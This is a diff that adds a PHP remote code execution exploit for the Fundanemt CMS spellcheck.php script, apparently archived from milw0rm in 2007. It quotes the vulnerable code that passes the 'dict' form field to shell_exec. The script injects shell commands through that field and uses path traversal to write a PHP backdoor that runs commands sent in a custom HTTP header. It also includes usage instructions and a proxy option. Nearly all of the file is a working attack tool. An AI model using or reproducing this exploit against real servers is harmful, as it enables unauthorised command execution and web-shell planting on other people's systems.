@@ -1,0 +1,247 @@
+<?php
+/*
+Exploit Name:
+Fundanemt <= 2.2.0 (spellcheck.php) Remote Code Execution Exploit
+
+Autor: Kacper
+Contact: kacper1964@yahoo.pl
+Homepage: http://www.rahim.webd.pl/
+Kacper Hacking & Security Blog: http://kacper.bblog.pl/
+Irc: irc.milw0rm.com:6667 #devilteam 
+
+Pozdro dla wszystkich z kanalu IRC oraz forum DEVIL TEAM.
+
+Pozdrawiam pl.zone-h.org, a najbardziej demo, oraz cala ekipe Zone-H.Org  :)
+
+script homepage/download/demo: http://www.fundanemt.org/
+*/
+
+if ($argc<4) {
+    print_r('
+---------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to Fundanemt
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /Fundanemt/ ls -la
+php '.$argv[0].' localhost /Fundanemt/ ls -la -P1.1.1.1:80
+---------------------------------------------------------------------------
+');
+die;
+}
+error_reporting(7);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function wyslijpakiet($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+$cmd="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>'-p') and ($temp<>'-P')) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'bad patch!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+/*
+Bad code:
+file spellcheck.php:
+=============================================================================
+<?php
+
+$text= $_POST['text'];
+$dict = $_POST['dict']; // <----------------------[^]
+$showsource= $_GET['showsource'];
+
+//
+// file paths and the aspell command have moved down below line 58
+//
+
+if (trim($text)!="") {
+    $showsource= 0;
+    $sourceinfo= "";
+    }
+
+print "<html>
+<head>
+<title>$uripath</title>
+<style type='text/css'>
+    body { font-family: Verdana, Geneva, sans-serif; font-size: 12px; line-height: 18px; background-color: #ffffff;}
+    table { font-family: Verdana, Geneva, sans-serif; font-size: 12px; }
+    .heading { font-size: 12px; font-weight: bold; background-color: #666677; color: #dddddd; border: 1px; border-style: solid; }
+    .oddrow { background-color: #ffffff; }
+    .evenrow { background-color: #ffffff; }
+</style>
+</head>
+<body>
+";
+// if text+check is supplied, first open and create $temptext, then spell check
+if (trim($text)!="" && ($_POST['submit']=="check"  || $_POST['submit']=="check igen")) {
+####### COFIG START ########    
+    $temptext= tempnam("/tmp", "spelltext");
+    
+    // if you spellcheck alot of HTML, add the -H flag to aspell to put it in SGML mode
+    $aspellcommand= "cat $temptext | /usr/bin/ispell -a -d$dict"; // <----------------------[^^]
+    
+    $indicator= "bold";
+    $opener= "<b>";
+    $closer= "</b>";
+######## END OF CONFIG ##########
+
+    if ($fd=fopen($temptext,"w")) {
+        $textarray= explode("\n",$text);
+        fwrite($fd,"!\n");
+        foreach($textarray as $key=>$value) {
+            // adding the carat to each line prevents the use of aspell commands within the text...
+            fwrite($fd,"^$value\n");
+            }
+        fclose($fd);
+        
+        // run aspell
+        $return= shell_exec($aspellcommand);  // <----------------------[^^^]
+=============================================================================
+nice code :)
+                                                                                                                                                                                                                                                                                                                                                                                */
+echo "Bug #1 (try insert poison file! work only when register globals = off)\n\n";
+$paths=array("../../../../../../../../../tmp/",
+             "../../../tmp/",
+             "../../../../tmp/",
+             "../../../../../tmp/",
+             "../../../../../../tmp/",
+             "../../../../../../../tmp/",
+             "../../../../../../../../tmp/");
+for ($i=0; $i<count($paths); $i++)
+{echo "Insert poison file! - [".$i."]\n\n";
+$my_path=urlencode($paths[$i]);
+$data ="-----------------------------b04bc63706572\r\n";
+$data.="Content-Disposition: form-data; name=\"text\";\r\n\r\n";
+$data.="Owned_by_DEVIL_TEAM\r\n";
+$data ="-----------------------------b04bc63706572\r\n";
+$data.="Content-Disposition: form-data; name=\"dict\";\r\n\r\n";
+$data.="Engelsk | echo ^<?php eval($_SERVER[HTTP_KACPER]);?^> > ".$my_path."hauru.php;\r\n";
+$data ="-----------------------------b04bc63706572\r\n";
+$data.="Content-Disposition: form-data; name=\"submit\";\r\n\r\n";
+$data.="check\r\n";
+$data.="-----------------------------b04bc63706572--\r\n";
+$packet ="POST ".$p."core/spellcheck/spellcheck.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------b04bc63706572\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+wyslijpakiet($packet);
+sleep(1);}
+$paths=array("../../../../../../../../../tmp/",
+             "../../../tmp/",
+             "../../../../tmp/",
+             "../../../../../tmp/",
+             "../../../../../../tmp/",
+             "../../../../../../../tmp/",
+             "../../../../../../../../tmp/");
+for ($i=0; $i<count($paths); $i++)
+{echo "Run poison file! - [".$i."]\n\n";
+$packet ="GET ".$p.$my_path."hauru.php HTTP/1.0\r\n";
+$packet.="KACPER: error_reporting(E_ALL);set_time_limit(0);echo \"_hauru_\";passthru(\$_SERVER[HTTP_KOMENDY]);echo \"_hauru_\";\r\n";
+$packet.="KOMENDY: $cmd\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+wyslijpakiet($packet,1);
+$out=explode("_hauru_",$html);
+echo $out[1];
+sleep(1);}
+echo "Try execute you command: ".$cmd."\n\n";
+echo "Bug #2\n\n";
+$data ="-----------------------------b04bc63706572\r\n";
+$data.="Content-Disposition: form-data; name=\"text\";\r\n\r\n";
+$data.="Owned_by_DEVIL_TEAM\r\n";
+$data ="-----------------------------b04bc63706572\r\n";
+$data.="Content-Disposition: form-data; name=\"dict\";\r\n\r\n";
+$data.="Engelsk | echo ^hauru^; ".$cmd."; echo ^hauru^;\r\n";
+$data ="-----------------------------b04bc63706572\r\n";
+$data.="Content-Disposition: form-data; name=\"submit\";\r\n\r\n";
+$data.="check\r\n";
+$data.="-----------------------------b04bc63706572--\r\n";
+$packet ="POST ".$p."core/spellcheck/spellcheck.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------b04bc63706572\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+wyslijpakiet($packet);
+if (eregi("Cannot set time limit in safe mode",$html))
+{echo "Exploit works, but safe mode = on\n";}
+elseif (eregi("hauru",$html)){
+$temp=explode("hauru",$html);
+echo $temp[1];}
+else{echo "exploit dont work... check phpinfo()...\n";}
+?>
+
+# milw0rm.com [2007-05-27]
